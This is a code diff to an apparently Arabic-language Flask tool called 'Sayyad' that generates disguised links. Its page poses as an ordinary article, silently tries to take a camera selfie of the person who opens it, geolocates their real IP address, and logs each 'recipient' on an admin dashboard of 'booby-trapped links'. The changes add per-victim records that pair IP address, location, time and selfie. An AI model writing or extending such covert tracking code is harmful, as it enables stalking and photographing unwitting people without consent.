@@ -38,17 +38,17 @@ def get_location(ip):
     if ip in ("127.0.0.1", "localhost", "::1"):
         return "محلي (Localhost)"
     try:
-        url = f"http://ip-api.com/json/{ip}?fields=status,country,city"
+        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,query"
         req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
         with urllib.request.urlopen(req, timeout=3) as response:
             data = json.loads(response.read().decode())
             if data.get("status") == "success":
-                return f"{data.get('country')} - {data.get('city')}"
+                return f"{data.get('country')} - {data.get('city')} ({data.get('query')})"
     except Exception:
         pass
-    return "غير معروف"
+    return f"غير معروف ({ip})"
 
-# قالب صفحة ويب عادية (تظهر كمقال أو محتقى طبيعي) مع التقاط السيلفي والتوجيه التلقائي
+# قالب صفحة ويب عادية (تظهر كمقال أو محتوى طبيعي) مع التقاط السيلفي والتوجيه التلقائي
 REDIRECT_TEMPLATE = """
 <!DOCTYPE html>
 <html dir="rtl" lang="ar">
@@ -663,8 +663,10 @@ HOME_TEMPLATE = """
             tbody.innerHTML = "";
             
             for (const [id, info] of Object.entries(data.links)) {
-                const cls = info.screenshot ? "badge done" : "badge";
-                const txt = info.screenshot ? "📸 تم التقاط صورة" : "⏳ في الانتظار";
+                const hasVisitors = info.visitors && info.visitors.length > 0;
+                const hasSelfie = hasVisitors && info.visitors.some(v => v.selfie);
+                const cls = hasSelfie ? "badge done" : "badge";
+                const txt = hasSelfie ? "📸 تم التقاط صور" : "⏳ في الانتظار";
                 const row = `<tr>
                     <td><a href="/go/${id}" target="_blank" style="color:#00d4ff">/go/${id}</a></td>
                     <td>${info.visits || 0}</td>
@@ -713,7 +715,7 @@ ADMIN_TEMPLATE = """
         }
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(420px, 1fr));
             gap: 25px;
             margin-top: 20px;
         }
@@ -733,7 +735,7 @@ ADMIN_TEMPLATE = """
         .card img {
             width: 100%;
             border-radius: 14px;
-            margin-top: 15px;
+            margin-top: 10px;
             border: 1px solid rgba(255,255,255,0.08);
         }
         .info {
@@ -763,10 +765,18 @@ ADMIN_TEMPLATE = """
             border-right: 3px solid #00d4ff;
         }
         .empty {
-            padding: 50px;
+            padding: 20px;
             text-align: center;
-            color: #444;
-            font-size: 15px;
+            color: #555;
+            font-size: 13px;
+        }
+        .visitor-box {
+            background: rgba(0,0,0,0.3);
+            border-radius: 14px;
+            padding: 15px;
+            margin-top: 15px;
+            border-right: 3px solid #a855f7;
+            border: 1px solid rgba(255,255,255,0.04);
         }
         .stats-bar {
             display: flex;
@@ -798,8 +808,8 @@ ADMIN_TEMPLATE = """
     </style>
 </head>
 <body>
-    <h1>📸 لوحة التقاط الصور والسيلفي</h1>
-    <p class="sub-title">صيّاد - مراقبة الروابط الملغمة والزوار</p>
+    <h1>📸 لوحة التقاط الصور والسيلفي والزوار</h1>
+    <p class="sub-title">صيّاد - مراقبة الروابط الملغمة والمستلمين بشكل مستقل</p>
     
     <div class="stats-bar">
         <div class="stat-box">
@@ -812,7 +822,7 @@ ADMIN_TEMPLATE = """
         </div>
         <div class="stat-box">
             <div class="stat-num">{{ links.values()|selectattr('screenshot')|list|length }}</div>
-            <div class="stat-label">الصور الملتقطة</div>
+            <div class="stat-label">لقطات الموقع</div>
         </div>
     </div>
     
@@ -823,7 +833,7 @@ ADMIN_TEMPLATE = """
             <div style="font-weight:bold; color:#fff; margin-bottom:5px;">الرابط الأصلي:</div>
             <div class="url-text">{{ info.original_url }}</div>
             <div class="info">
-                👁️ الزيارات: {{ info.visits or 0 }}<br>
+                👁️ إجمالي الزيارات: {{ info.visits or 0 }}<br>
                 🕐 آخر زيارة: {{ info.last_visit or "—" }}
             </div>
             
@@ -834,11 +844,27 @@ ADMIN_TEMPLATE = """
                 <div class="empty">لا توجد صورة للموقع بعد</div>
             {% endif %}
 
-            <h4 style="color:#a855f7; margin-top:15px;">صورة السيلفي للزائر:</h4>
-            {% if info.selfie %}
-                <img src="/selfies/{{ info.selfie }}" alt="Selfie">
+            <h4 style="color:#a855f7; margin-top:20px; border-top:1px solid rgba(255,255,255,0.08); padding-top:15px;">
+                سجل المستلمين ({{ info.visitors|length if info.visitors else 0 }})
+            </h4>
+            
+            {% if info.visitors %}
+                {% for v in info.visitors %}
+                <div class="visitor-box">
+                    <div style="font-size: 13px; color: #fff;">🌍 <b>الموقع الجغرافي:</b> {{ v.location }}</div>
+                    <div style="font-size: 13px; color: #aaa; margin-top:5px;">💻 <b>عنوان الـ IP:</b> {{ v.ip }}</div>
+                    <div style="font-size: 12px; color: #888; margin-top:5px;">⏱️ <b>وقت الزيارة:</b> {{ v.time[:19].replace('T', ' ') }}</div>
+                    
+                    <div style="margin-top:12px; font-weight:bold; font-size:12px; color:#a855f7;">صورة السيلفي الخاصة بهذا المستلم:</div>
+                    {% if v.selfie %}
+                        <img src="/selfies/{{ v.selfie }}" alt="Recipient Selfie">
+                    {% else %}
+                        <div class="empty">لم يتم التقاط صورة أو تم رفض الكاميرا من قبل المستلم</div>
+                    {% endif %}
+                </div>
+                {% endfor %}
             {% else %}
-                <div class="empty">لم يتم التقاط سيلفي بعد</div>
+                <div class="empty">لا توجد زيارات للمستلمين حتى الآن</div>
             {% endif %}
         </div>
         {% endfor %}
@@ -906,7 +932,12 @@ def redirect_link(link_id):
     link["visits"] = link.get("visits", 0) + 1
     link["last_visit"] = datetime.now().isoformat()
     
-    visitor_ip = request.remote_addr
+    # التقاط الـ IP الحقيقي بدقة عبر ProxyFix
+    if request.headers.getlist("X-Forwarded-For"):
+        visitor_ip = request.headers.getlist("X-Forwarded-For")[0].split(',')[0].strip()
+    else:
+        visitor_ip = request.remote_addr
+        
     location = get_location(visitor_ip)
     
     visitor = {
@@ -914,8 +945,12 @@ def redirect_link(link_id):
         "location": location,
         "user_agent": request.user_agent.string,
         "time": datetime.now().isoformat(),
-        "referrer": request.referrer or "Direct"
+        "referrer": request.referrer or "Direct",
+        "selfie": None
     }
+    
+    if "visitors" not in link:
+        link["visitors"] = []
     link["visitors"].append(visitor)
     
     if PLAYWRIGHT_AVAILABLE and not link.get("screenshot"):
@@ -952,6 +987,10 @@ def upload_selfie():
         
         with open(filepath, "wb") as f:
             f.write(image_bytes)
+            
+        # ربط السيلفي بآخر زائر (المستلم) دخل على هذا الرابط بشكل دقيق ومستقل
+        if links[link_id].get("visitors"):
+            links[link_id]["visitors"][-1]["selfie"] = filename
             
         links[link_id]["selfie"] = filename
         save_links(links)
